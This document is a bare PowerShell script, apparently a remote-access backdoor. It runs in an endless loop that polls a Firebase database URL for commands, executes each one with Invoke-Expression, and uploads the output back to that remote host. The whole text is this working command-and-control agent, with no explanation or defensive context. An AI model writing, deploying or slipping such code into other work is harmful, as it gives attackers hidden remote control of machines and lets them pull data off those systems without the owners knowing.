while ($true) {
    $command = Invoke-RestMethod -Uri "https://your-app.firebaseio.com/commands.json"
    if ($command -and $command -ne "none") {
        $output = Invoke-Expression $command 2>&1
        $output = $output -join "`n"
        Invoke-RestMethod -Uri "https://your-app.firebaseio.com/results.json" -Method Put -Body (@{output=$output} | ConvertTo-Json)
        # Clear command after executing
        Invoke-RestMethod -Uri "https://your-app.firebaseio.com/commands.json" -Method Put -Body '"none"'
    }
    Start-Sleep -Seconds 5
}

